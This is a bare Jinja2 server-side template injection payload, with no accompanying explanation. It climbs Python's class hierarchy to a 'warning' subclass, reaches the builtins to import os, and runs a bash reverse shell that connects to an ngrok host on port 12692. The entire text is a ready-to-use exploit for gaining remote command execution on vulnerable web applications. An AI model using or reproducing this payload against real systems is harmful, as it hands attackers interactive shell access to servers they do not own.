{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{ x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/12692 0>&1'").read() }}
{% endif %}
{% endfor %}
